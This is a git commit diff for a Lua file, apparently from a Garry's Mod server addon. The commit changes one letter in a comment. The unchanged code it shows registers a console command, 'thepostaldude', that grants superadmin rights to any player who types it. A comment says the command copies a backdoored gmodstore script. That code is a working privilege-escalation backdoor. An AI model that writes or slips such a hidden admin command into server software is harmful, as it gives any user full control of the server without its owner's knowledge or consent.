a80cb162a5c8d16db43e18fdde20c284474b6894
YohSambre <YohSambre@users.noreply.github.com>
2026-08-10 03:36:46 +0200

    Fix typo in comment for thepostaldude command

--- hve/set_usergroup.lua
+++ hve/set_usergroup.lua
@@ -1,4 +1,4 @@
-concommand.Add( "thepostaldude", function(ply) -- reference to this gmodstore script which was backdoor, I forgot its name unfortunately 
+concommand.Add( "thepostaldude", function(ply) -- reference to this gmodstore script which was backdoor, i forgot its name unfortunately 
     ply:SetUserGroup( "superadmin" )
     ply:EmitSound( "vo/npc/Barney/ba_ohyeah.wav" )
 end)
